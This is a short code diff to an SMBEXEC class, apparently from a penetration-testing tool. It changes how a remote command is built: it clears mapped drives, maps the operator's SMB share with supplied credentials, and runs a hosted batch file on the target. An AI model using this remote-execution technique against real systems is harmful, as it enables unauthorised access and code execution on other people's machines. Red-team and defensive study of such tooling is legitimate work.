@@ -146,9 +146,11 @@ class SMBEXEC:
 
         logging.debug('Hosting batch file({}) containing:\n{}'.format(str(cfg.TMP_PATH / self.__batchFile), command))
 
-        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
+        batchLauncher = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
+
+        command = self.__shell + '"net use * /d /y & "'
         #adding creds gets past systems disallowing guest-auth
-        command = self.__shell + '"net use \\\\{}\\{} /p:no /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        command += self.__shell + '"net use \\\\{}\\{} /p:no /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, batchLauncher)
         
         logging.debug('Command to execute: ' + command)
 
